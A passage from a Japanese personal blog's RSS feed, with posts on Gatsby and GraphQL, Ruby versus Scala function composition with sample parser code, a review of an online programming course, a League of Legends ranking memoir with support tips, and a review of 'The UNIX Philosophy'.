&lt;p>公式の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB">チュートリアル&lt;/a>をみながら色々やったのだけど、Hookというのが直感的だし記述量も少ないしで楽しかった。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%DD%A1%BC%A5%CD%A5%F3%A5%C8">コンポーネント&lt;/a>ディドマウントとかよりだいぶわかりやすくなった気がする。&lt;br>
今回のブログだとトップページの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>のランクステータスをfetchしてるところでHookを使っている。 このブログのコードを社のフロントの人にみせたらfetchしてる間もなにか表示した方がいいという金言をもらったので is Loading..をfetch中に表示するようにした。&lt;br>
バックエンドだと非同期ジョブとかDBのロックとかいかにも非同期非同期してるところしか非同期処理を意識しないので、フロントでhttpレスポンスが返ってくるのを待っている間とかの処理を考えるのは脳に新鮮な刺激で楽しい。&lt;/p>
&lt;h2>クライアントにとってのGraphQL&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Gatsby">Gatsby&lt;/a>は静的データをGraphQLで扱うことができる。
とってくるクエリごとに名前をつけて型を作れるため、サンプルレスポンスといちいちにらめっこしたりする必要がないのが体験がいい。
nullableはできるだけ避けたいとか、空文字はjs界だとfalseだったりとかも面白かった。
業務では逆に僕がGraphQLサーバーを書く側なのだけれど、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Gatsby">Gatsby&lt;/a>.jsの経験を通してよりよい&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B9%A5%AD%A1%BC%A5%DE">スキーマ&lt;/a>を定義できればいいな。&lt;/p>
&lt;h2>ブログの内容の予定&lt;/h2>
&lt;p>本当にチラ裏みたいなことを書いていくと思う。まだまだブログとしても寂しいし&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9">ソースコード&lt;/a>も記事もちょこちょこいじっていくぞ。&lt;/p>
&lt;/body></description></item><item><title>ScalaとRubyで関数合成してみる</title><link>https://qwyng.dev/posts/2020/04/12/173511/</link><pubDate>Sun, 12 Apr 2020 17:35:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/04/12/173511/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/N%CD%BD%C8%F7%B9%BB">N予備校&lt;/a>で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>応用編を受講したので&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>と比較して色々やってみたくなった。&lt;/p>
&lt;h2>まえおき&lt;/h2>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>と似てる気がする&lt;/h3>
&lt;blockquote class="twitter-tweet">
&lt;p lang="ja" dir="ltr">これは思想が似てる(オブジェクト思考と関数型の融合）だからなのかもしれないけど&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/scala">scala&lt;/a>と&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>って似てる気がするんだよな&lt;br>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/DSL">DSL&lt;/a>かけたりとかシンプルな構文だったりとか&lt;/p>— とるめん (@qwyngg) &lt;a href="https://twitter.com/qwyngg/status/1244622817456340992?ref_src=twsrc%5Etfw">March 30, 2020&lt;/a>
&lt;/blockquote>
&lt;p> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>は関数（というか処理をまとめたProcかMethodの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>）も他のオブジェクトと同等だし、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>も同様で関数の返り値や引数を関数にしたりできる。&lt;/p>
&lt;h2>関数合成してみる&lt;/h2>
&lt;p>例えば文字列 "true"と”false"をパースする関数を書くためにtruePaser、falsePaserそれぞれを定義して関数合成したいとする。
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>なら&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class ParseResult
attr_accessor :value
end
class Success &amp;lt; ParseResult
def initialize(value)
@value = value
end
end
class Failure &amp;lt; ParseResult
def initialize; end
end
def true_parser(input)
if input == "true"
Success.new(true)
else
Failure.new
end
end
def false_parser(input)
if input == "false"
Success.new(false)
else
Failure.new
end
end
def select(left, right)
Proc.new do |input|
if (success = left.call(input)).class == Success
success
else
right.call(input)
end
end
end
true_parser_method = method(:true_parser)
false_parser_method = method(:false_parser)
puts select(true_parser_method, false_parser_method).call('true').value　 # true
puts select(true_parser_method, false_parser_method).call('false').value # false
puts select(true_parser_method, false_parser_method).call('hogehoge').value # （何も出力されない）
&lt;/pre>
&lt;p>合成は問題なくできるが結局selectが何をするProcを返すのかわかりにくい。&lt;/p>
&lt;p>ここで型がある&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>だと&lt;/p>
&lt;pre class="code lang-scala" data-lang="scala" data-unlink> object Main extends App {
sealed trait ParseResult[+T] {
def value :Option[T]
}
case class Success[+T](in_value: T) extends ParseResult[T] {
def value: Option[T] = Option(in_value)
}
case object Failure extends ParseResult[Nothing] {
def value: Option[Nothing] = None
}
type Parser[+T] = String =&amp;gt; ParseResult[T]
def trueParser: Parser[Boolean] = input =&amp;gt;
if (input == "true") {
Success(true)
} else {
Failure
}
def falseParser: Parser[Boolean] = input =&amp;gt;
if (input == "false") {
Success(false)
} else {
Failure
}
def select[T, U &amp;gt;: T](left: =&amp;gt; Parser[T], right: =&amp;gt; Parser[U]): Parser[U] = input =&amp;gt; {
left(input) match {
case success@Success(_) =&amp;gt; success
case Failure =&amp;gt; right(input)
}
}
println(select(trueParser, falseParser)("true").value) // Success(true)
println(select(trueParser, falseParser)("false").value) // Success(false)
println(select(trueParser, falseParser)("hogehoge").value) // None
}
&lt;/pre>
&lt;p>型があると、関数合成をする関数を定義する時点で引数に取りたい関数のパラメーターを表現でき、合成関数の返り値に何を引数として渡したら良いかわかりやすい。 後Rust同様Option型が便利。&lt;br>
対して、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>は型がないことで明らかに記述量へるし多分僕の書いた以上に研ぎ澄ますこともできると思う。あと&lt;code>object Main extends App&lt;/code>みたいなのがいらない。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B4%D8%BF%F4%B7%BF%B8%C0%B8%EC">関数型言語&lt;/a>として関数の集まりを書いていくなら型があったほうが扱いやすいのでは？という気持ち。Lisｐは型ないけど。
入出力に対してルールがある程度形式張って表現されていたほうが関数を組み合わせやすい気がする。&lt;/p>
&lt;/body></description></item><item><title>N予備校が無料だったのでプログラミングコースをちょっとやってみた</title><link>https://qwyng.dev/posts/2020/03/17/003957/</link><pubDate>Tue, 17 Mar 2020 00:39:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/03/17/003957/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/N%CD%BD%C8%F7%B9%BB">N予備校&lt;/a>が世の中のもろもろで無料だったのでプログラミングコースを少し受講してみた。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.nnn.ed.nico%2F" title="参考書を買う前に　予備校に行く前に| N予備校" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://www.nnn.ed.nico/">www.nnn.ed.nico&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>良かったところ&lt;/h2>
&lt;h3>教材の質が尋常じゃない&lt;/h3>
&lt;p>本来有償のものなので具体的なリンクは貼れないのだけど、教材一つ一つの質がとんでもなく高い。
「とにかくコードを書かせて体験してもらう」というのが徹底されている。例えば、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/CSRF">CSRF&lt;/a>対策や&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%BB%A5%C3%A5%B7%A5%E7%A5%F3%A5%CF%A5%A4%A5%B8%A5%E3%A5%C3%A5%AF">セッションハイジャック&lt;/a>に対して、再現アプリケーションが公開され具体的な動作を確認でき、対策方法の具体的な内容、実際にコードでどうやって対策するかまで全て解説があった。更に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a>から問題をフォークしてPRを送るという課題まである。驚くべきはこれらのセキリュティに対しての記事が「プログラミング入門」という「プログラミングとはコンピュターに対して命令を与えるものです」という内容から始まるコースの第三章に掲載されている内容であるということ。この章をやるだけで巷のプログラミングスクール以上の知識がみにつくのではないかと思う。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>について学ぶコースで「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>基礎コース」があるのだけれどforとかwhileの説明で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C5%BE%C3%D6%A5%A4%A5%F3%A5%C7%A5%C3%A5%AF%A5%B9">転置インデックス&lt;/a>やBM法にまで話がすすんでいたり、最短経路問題やbit探索など&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>を通してCSの勉強がきっちり行われている感じだった。実際にアプリケーションを書いてそれを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EA%A5%D5%A5%A1%A5%AF%A5%BF%A5%EA%A5%F3%A5%B0">リファクタリング&lt;/a>していく章まである。これらは全て「基礎コース」であり「応用コース」は別にある。「応用コース」では参照透過性とかストリームなんかも扱っていて、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>以外にも応用がきく概念を習得できると思う。&lt;/p>
&lt;h3>動画つき&lt;/h3>
&lt;p>僕はみてないんだけど授業動画もあるようだ。なんか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%EB%A5%EB%A1%BC%A5%B7%A5%E5">ルルーシュ&lt;/a>のコスプレしてる人が写ってた。&lt;/p>
&lt;h2>おやと思ったところ&lt;/h2>
&lt;h3>コース間の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C6%B0%C0%FE">動線&lt;/a>
&lt;/h3>
&lt;p>コースとコースの関連がコース最初の手引きぐらいでしかわからなかった。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>基礎コースのページで次へを踏んだら&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>応用コースに飛ばしてほしい…。僕が見つけてないだけで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%DE%A4%C8%A4%E1%A5%DA%A1%BC%A5%B8">まとめページ&lt;/a>みたいなのがあるのかもしれない。&lt;/p>
&lt;h3>継続率&lt;/h3>
&lt;p>これは不満というか不安な部分なんだけど最初のプログラミング入門コースでは何百とあった練習問題のPRが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>基礎コースではかなり少なくなっていた。ある程度プログラミング経験のある僕ですら良く出来てるなぁと思うくらいのなので「プログラミング初めて！」みたいな人はなかなかついていくのが難しそう。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>個人的には&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Scala">Scala&lt;/a>完全理解した（この完全理解は全然わかってないの意）ので良かった。これで月額1000円なのは安すぎる。僕自身プログラミングスクールからエンジニアに転職した身だが、スクールに通わなくてもこの教材をやれば仕事がないってことはないんじゃなかろうか。学生達がこれをバンバン進めているかと思うとすごい世の中である。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Android">Android&lt;/a>コースなんかもやってみようかな。&lt;/p>
&lt;/body></description></item><item><title>League of legendsでダイヤモンドに昇格した。サポートでsoloQを勝ちぬくには</title><link>https://qwyng.dev/posts/2020/03/08/133900/</link><pubDate>Sun, 08 Mar 2020 13:39:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/03/08/133900/</guid><description>&lt;body>
&lt;p>League of legends（以下&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>）で自分語りしていきたい。大学入学から20代前半はずっとこのゲームをやっていた。最後にめっちゃためになるsoloQ tipsも書いたので読んで欲しい。&lt;br>
これがマイOP.GG。&lt;br>
&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fjp.op.gg%2Fsummoner%2FuserName%3DQWYNG" title="QWYNG - Summoner Stats - League of Legends" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://jp.op.gg/summoner/userName=QWYNG">jp.op.gg&lt;/a>&lt;/cite>&lt;/p>
&lt;h1>シーズン4&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308133243.jpg" alt="f:id:sasa5740:20200308133243j:plain" title="f:id:sasa5740:20200308133243j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
最初は「簡単、強い」でチャンピオン検索したらmordekaiserが出てきたので200戦ぐらいスパムしてた。ちなみにずっとシルバーだった。
昔のmordeはEが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/AOE">AOE&lt;/a>でプッシュとハラスが両立しやすく簡単だったのは間違いない。huehuehue。&lt;/p>
&lt;h1>シーズン5&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308133732.jpg" alt="f:id:sasa5740:20200308133732j:plain" title="f:id:sasa5740:20200308133732j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
このシーズンで初めてプレシーズンでゴールドになり、シーズン中にプラチナになった。あまりにも嬉しかったことを覚えている。このころからサポートをやるようになった。Jannaがとにかく壊れておりピールという行為をするだけで勝てた。Topヘカリムも好きだったので使っていた記憶がある。ホームガードTP最強！&lt;/p>
&lt;h1>シーズン6&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308151609.jpg" alt="f:id:sasa5740:20200308151609j:plain" title="f:id:sasa5740:20200308151609j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
スレッシュをやり始める。。NAのサーバーが移動してラグくなったので台湾サーバーでランクを回していた。台湾ではヘカリムとサポートを回してプラチナ2まで上がった。最初にソロQでダイヤ枠と当たったときは興奮したものだ。&lt;/p>
&lt;h1>シーズン7&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308151906.jpg" alt="f:id:sasa5740:20200308151906j:plain" title="f:id:sasa5740:20200308151906j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
サポートというロールに嫌気が差して色々なチャンピオンを触っていた。そんなに残業があったりするような会社ではなかったのでランクの回数はこなすことができた。しかし、当然付け焼き刃のチャンピオンでは勝てず、シーズン後半にスレッシュで何とかプラチナに上げるような感じのシーズンだった。今見ると思ったよりルシアンを使っていた。なんで？&lt;/p>
&lt;h1>シーズン8&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308155202.jpg" alt="f:id:sasa5740:20200308155202j:plain" title="f:id:sasa5740:20200308155202j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
仕事が2年目になり忙しくはないもののメンタル的にキツくなっており、ゲーム内でも暴言を吐いたりAFKするようになった。おかげで勝率も下がり結局プラチナ止まり。&lt;/p>
&lt;h1>シーズン9&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308155258.jpg" alt="f:id:sasa5740:20200308155258j:plain" title="f:id:sasa5740:20200308155258j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E9%A5%AB%A5%F3">ラカン&lt;/a>わりと使っていた。電撃&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E9%A5%AB%A5%F3">ラカン&lt;/a>をどこかの動画で見て真似してスパムしていた。このシーズンもプラチナにはなった。&lt;br>
転職したのでメンタルは正常になったがゲーム内のメンタルは変わらずTOXICなプレイをし続けシーズン終わりに2週間バンされた。
このとき初めてチャットをミュートしたり暴言を無視することを覚え、何とか2019年中に名誉レベルを2に戻した。&lt;/p>
&lt;h1>シーズン10&lt;/h1>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20200308/20200308155337.jpg" alt="f:id:sasa5740:20200308155337j:plain" title="f:id:sasa5740:20200308155337j:plain" class="hatena-fotolife" itemprop="image">&lt;/span>
ひたすらスレッシュをスパムした。ロールも絶対にブレずにサポートだけやり続けて他のロールになったら昇格戦以外は全てドッジするようにした。暴言吐いてきた奴がいたらちゃんとミュートし、マイナスなチャットはしないようにした。そうすると勝率はドンドンあがりシーズン開始一週間でプラチナになり、そのまま勝率58%でダイヤモンドになった。涙が出るほど嬉しかった。勝率は変わらずD3になりD4&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B2%A1%BC%A5%C8%A5%AD%A1%BC%A5%D1%A1%BC">ゲートキーパー&lt;/a>化も回避した。&lt;br>
このままならダイヤ上位も十分なれるしワンチャンマスターにもなれるんじゃないかと思っている。&lt;/p>
&lt;h1>サポートとしてsoloQで勝つために&lt;/h1>
&lt;p>少なくとも日本鯖のダイア以下では、&lt;/p>
&lt;ul>
&lt;li>メンタルを保つ。このゲームはメンタルが六割であり連勝しているときはなるだけランクを回すべきだし連敗したら大人しく寝たほうがいい。&lt;/li>
&lt;li>暴言をはかない。すねない。不貞腐れない。炊いてもそれを画面には出さない。これらの行為は勝率を上げることになにも貢献しないのでする意味がない。ムカついたやつがいたらレポート画面で罵詈雑言思いっきり書いてレポートすれば良い。&lt;/li>
&lt;li>jgとmidを常にみる。soloQは人数差ゲームであり、人数差を作るのはだいたいmidかjg、相手のjgとmidの位置を常に考え4マンダイブ喰らいそうなら予め下がってランタンを準備するべし（そういう意味でもスレッシュはOP）。味方のjgが相手と川で争いそうならすぐに寄らなくてはならない。&lt;/li>
&lt;li>ぶれない。絶対に連敗が重なる時期が来るがそこでmidしたりjgしたくなってもやってはならない。どうせ対面には手も足も出ない。&lt;/li>
&lt;li>ワードを三個おいたらさっさとリコールする。ワードを三個おいたらサポートはファームする必要がない。サポートの4割はワード貯蔵庫。ピンクワードは絶対に二個買え。&lt;/li>
&lt;li>レーンでは距離感を意識する。例えば相手はソラカならQの射程ギリギリで常にステップすること。相手はスキルを外しやすくなりCDというスキが生まれる。フック系に対してもこちらがフックを当てるのではなく如何に相手のフックを躱すかを意識したほうがいい。こうすると相手もこちらのガンクに気づきにくくなる。&lt;/li>
&lt;li>相手がCSを取るタイミングでハラスする。あたり前田のクラッカー。&lt;/li>
&lt;li>フラッシュはできるかぎりメモる。サポートが一番暇なのでメモるのはサポートの仕事。対面だけでなくTOPやMIDのフラッシュもできるかぎりメモる。チャットでタイムスタンプをオンにしてフラッシュしたことだけメモしておき、リコール後に計算するでも良い。これで味方がガンクにくる確率が上がる。&lt;/li>
&lt;/ul>
&lt;p>半分自分に言い聞かせているところがあるがこんなところだろう。&lt;/p>
&lt;h1>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>を六年やって&lt;/h1>
&lt;p>このゲームははっきり言ってあまり人に進められない。かんたんにメンタルを壊しにくるし敷居もめっちゃ高い。しかし、様々な操作感のキャ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E9%A5%AF">ラク&lt;/a>ターを同じ条件から少しづつ上回っていき相手を叩きのめす感覚は他のゲームではなかなか味わえない。二週間に一度のパッチでメタが変わるので飽きることもない。世界で一番遊ばれていのにはそれなりに理由があるし、いわゆるesportsのイベントも世界的に盛んである。日本でLJLほど成功してるesportsイベントはないんじゃなかろうか。&lt;br>
このゲームで知り合った人や物事で色々な意味で人生が変わったとも言える。エンジニアになったのもこのゲームの影響である。&lt;/p>
&lt;h1>今後&lt;/h1>
&lt;p>エンジニアで&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>やってる人の知り合いがほしい。明確に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>やっていると知っている人はひよこ大佐氏くらいである。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rubyist">Rubyist&lt;/a>であまりPCゲーをやっている人を知らない。みんな、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/LOL">LOL&lt;/a>やろう！！！！！！！！！！！！！！！！！！！！&lt;/p>
&lt;/body></description></item><item><title>「UNIXという考え方」を読んだ</title><link>https://qwyng.dev/posts/2020/03/01/165135/</link><pubDate>Sun, 01 Mar 2020 16:51:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/03/01/165135/</guid><description>&lt;body>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%C5%C5%BB%D2%BD%F1%C0%D2">電子書籍&lt;/a>がなかったので久々に物理で読んだ&lt;/p>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4274064069/hatena-blog-22/">&lt;img src="https://m.media-amazon.com/images/I/518ME653H3L._SL160_.jpg" class="hatena-asin-detail-image" alt="UNIXという考え方―その設計思想と哲学" title="UNIXという考え方―その設計思想と哲学">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="https://www.amazon.co.jp/exec/obidos/ASIN/4274064069/hatena-blog-22/">UNIXという考え方―その設計思想と哲学&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span>&lt;a href="http://d.hatena.ne.jp/keyword/Mike%20Gancarz" class="keyword">Mike Gancarz&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2001/02/01&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;h2>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>の定理への感想&lt;/h2>
&lt;h3>小さいものは美しい&lt;/h3>
&lt;p>小さいとわかりやすく、保守しやすい、組み合わせやすい、計算機のリソースにも優しいということ。僕はプログラム単体でこれを意識していることはないけど、関数単位ではほとんどの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DE">プログラマ&lt;/a>がこの定理は大事だというだろう。&lt;/p>
&lt;h3>一つのプログラムには一つのことをうまくやらせる&lt;/h3>
&lt;p>いわく関心の分離。やりたいことの本質のみを行うことが柔軟性につながる。lsコマンドも本来は複数の列に整理して出力すべきではないらしい。
これも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D7%A5%ED%A5%B0%A5%E9%A5%DE">プログラマ&lt;/a>ならまず意識していることだと思う。一つの関数、一つのモジュールには一つの機能、わかりやすい変数名と共にコードの基本な気がする（かつ難しい）。&lt;/p>
&lt;h3>できるだけ早く試作をつくる&lt;/h3>
&lt;p>これも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%B8%A5%E3%A5%A4%A5%EB">アジャイル&lt;/a>的な言葉で最近のエンジニアは重視している考え方だと思う。ソフトウェアはつくるのではなく育てて行くものだという考え方。
この本では&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>の成長過程と共にこの考え方が紹介されていた。ソフトウェアには3つの段階しかなく、若年期、成熟期、老年期しかない。最近だと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a>は老年期にはいってきているのだろうか。&lt;br>
最近、自分の仕事でも早期の試作の利点を体感することがあった。新機能を開発で議論をする時に、チームメンバーがそれぞれの頭の中の機能で話しすぎてそれぞれの議論が噛み合わないという問題があった。けれど、デザイナーの方がモックを作ってくれるようになった途端議論がスムーズになったという体験だ。具体的な図面はチームで議論する上で強力な標識となることをこのとき認識した。&lt;br>
この定理でのドキュメントに関する考え方も面白かった。ドキュメントを詳細に書くことが正義だと思っていたが、ドキュメントも育てるものであり、ちょっとしたことでも芽を残すことを意識して「気楽に」ドキュメントを残したほうが結果的に良いのかなとも考えた。&lt;/p>
&lt;h3>効率より移植性&lt;/h3>
&lt;p>ハードウェアは日々移り変わるので移植しにくいソフトウェアは長生きしないというもの。Webで色々やっているとHTTPでソフトウェアを配るのが現実的になってきていると思う。それこそ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ChromeBook">ChromeBook&lt;/a>が体現していて、HTTPとその解釈ができるブラウザさえあれば他のサービスは全てブラウザを通して使える。サーバー単体のハードウェアではなく通信規格にいかにのっかれるかという時代に突入している気がする。いつかHTTPを超えるなにかが出て人々はそれをつかって情報をやり取りするようになるのだろうか。&lt;/p>
&lt;h3>数値データはASCIIフラットファイルに保存する。&lt;/h3>
&lt;p>「効率より移植性」と同様の感想をもった。&lt;/p>
&lt;h3>ソフトウェアを梃子として扱う&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BC%D6%CE%D8%A4%CE%BA%C6%C8%AF%CC%C0">車輪の再発明&lt;/a>は良くないというもの。そして人類全体でソフトウェアを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CA%A3%CD%F8">複利&lt;/a>させていこうとい考え方だと思う。なにも開発に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>を使っていくだけじゃなく日々の作業で人のソフトウェアを使っていこうという気にさせられた。&lt;/p>
&lt;h3>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B7%A5%A7%A5%EB%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8">シェルスクリプト&lt;/a>によって梃子の効果と移植性を高める&lt;/h3>
&lt;p>「ソフトウェアを梃子として扱う」と同じ&lt;/p>
&lt;h3>過度の対話的&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%D5%A5%A7%A5%A4%A5%B9">インターフェイス&lt;/a>をさける&lt;/h3>
&lt;p>なるほど言われてみると確かに、という話には感じる。ユーザーを束縛する&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A1%BC%A5%D5%A5%A7%A5%A4%A5%B9">インターフェイス&lt;/a>はソフトウェアを組み合わせにくくし、バックグラウンドで実行させたりもできない。コマンドをつくる側からするとこれも重要な観点の一つなんだろう。RESTがステートレスを基本に作られてなければこれほど世界で&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Web%A5%B5%A1%BC%A5%D3%A5%B9">Webサービス&lt;/a>は流行らなかった気がするし納得。&lt;/p>
&lt;h3>全てのプログラムをフィルタとして設計する&lt;/h3>
&lt;p>それはそう。フィルタとしての機能を単独にするべきということにつながる。&lt;/p>
&lt;h2>まとめ&lt;/h2>
&lt;p>特に前半の「小さいものは美しい」、「一つのプログラムには一つのことをうまくやらせる」、「できるだけ早く試作をつくる」、「効率より移植性」は全てのソフトウェア開発で役にたつ考え方だと感じた。&lt;br>
あと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%B8%A5%E3%A5%A4%A5%EB">アジャイル&lt;/a>開発で「ユーザーの価値を考える」をそのまま「ユーザーにとっての価値を増やす」にすると機能を増やしすぎてユーザーの価値がぼやけるという問題もこれから起きるのかなぁとか思ったりした。&lt;/p>
&lt;/body></description></item><item><title>一人暮らしリモートワークで本当に捗るもの、それは沼</title><link>https://qwyng.dev/posts/2020/02/28/213927/</link><pubDate>Fri, 28 Feb 2020 21:39:00 +0900</pubDate><guid>https://qwyng.dev/posts/2020/02/28/213927/</guid><description>&lt;body>
&lt;p>一人暮らしのリモートワークで困るもの、それは食事である。&lt;br>
会社であれば周りのコンビニや社食で買えばいいが、一日家にいるとなると話が違う。&lt;br>
また、出社していれば「通勤のついでに何かを買う」という行為ができたのでコンビニやお店に行くのも対して手間ではなかったが、リモートだと外にでるのすら億劫になる。 &lt;br>
全て家の中で解決させたい。そんなあなたにおすすめの食事がある。&lt;/p>
&lt;h2>沼&lt;/h2>
&lt;p>沼です&lt;/p>
